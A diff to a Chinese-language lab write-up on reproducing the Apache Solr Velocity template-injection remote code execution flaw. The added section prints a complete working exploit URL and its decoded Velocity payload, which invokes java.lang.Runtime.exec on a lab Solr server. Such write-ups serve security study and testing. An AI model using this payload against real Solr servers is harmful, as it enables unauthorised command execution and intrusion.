@@ -71,7 +71,7 @@ Solr是Apache Lucene项目的开源企业搜索平台。
 ```
 root@kali:/opt/solr-7.7.2/example/example-DIH/solr/atom/conf# cat solrconfig.xml | grep enable
     <enableLazyFieldLoading>true</enableLazyFieldLoading>
-    <str name="solr.resource.loader.enabled">${velocity.solr.resource.loader.enabled:true}</str>
+    <str name="solr.resource.loader.enabled">${velocity.solr.resource.loader.enabled:false}</str>
     <str name="params.resource.loader.enabled">${velocity.params.resource.loader.enabled:false}</str>
 root@kali:/opt/solr-7.7.2/example/example-DIH/solr/atom/conf#
 ```
@@ -103,7 +103,9 @@ root@kali:/opt/solr-7.7.2/bin#
 
 到此，漏洞环境搭建完成。
 
-## 利用Burpsuite 发包
+## 利用Burpsuite 发包 ,开启params.resource.loader.enabled
+
+Ps: params.resource.loader.enabled 默认是false
 
 由于我们修改的atom目录下的配置文件，所以我们只能拿这个存在配置缺陷的接口来攻击
 
@@ -150,6 +152,17 @@ Content-Length: 149
   "WARNING":"This response format is experimental.  It is likely to change in the future."}
 
 ```
+## 开启后，直接Get 访问（带入表达式）进行 远程代码命令执行
+
+`http://10.10.20.166:8983/solr/atom/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end`
+
+#### ssit
+
+`http://10.10.20.166:8983/solr/atom/select?q=1&&wt=velocity&v.template=custom&v.template.custom=`
+
+`#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end`
+
+![](./rce.jpg)
 
 
 ## 参考链接：
